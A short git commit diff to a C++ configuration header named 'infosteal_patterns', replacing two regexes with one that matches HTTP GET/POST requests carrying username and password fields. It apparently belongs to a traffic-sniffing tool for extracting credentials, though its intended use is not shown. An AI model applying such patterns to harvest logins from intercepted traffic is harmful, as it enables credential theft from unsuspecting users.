52942dfb70eb01fa7520456836c79d2a4b569a1c
Sgt Supergeil <maxrademacher02@gmail.com>
2021-07-14 00:21:20 +0200

    changed default regex matching pattern

--- src/conf/infosteal_patterns.h
+++ src/conf/infosteal_patterns.h
@@ -5,8 +5,7 @@ namespace conf {
 
 	const std::vector<ifs_pattern_entry> infosteal_patterns = {
 
-		ifs_pattern_entry("generic_passwordfield",std::regex("^.*(?:password|pwd|passwd|pass)=.*$",std::regex_constants::icase)),
-		ifs_pattern_entry("generic_login_post",std::regex("POST .*(?:login|auth).*[\\s\\S]*",std::regex_constants::icase))
+		ifs_pattern_entry("generic_credential",std::regex("^(?:POST|GET)[\\s\\S]*(?:(\\r)?\\n){2}[\\s\\S]*(?:username|user|uname|name|)?=[\\s\\S]*(?:password|pass|pwd|secret)=[\\s\\S]*$",std::regex_constants::icase))
 
 	};
 }
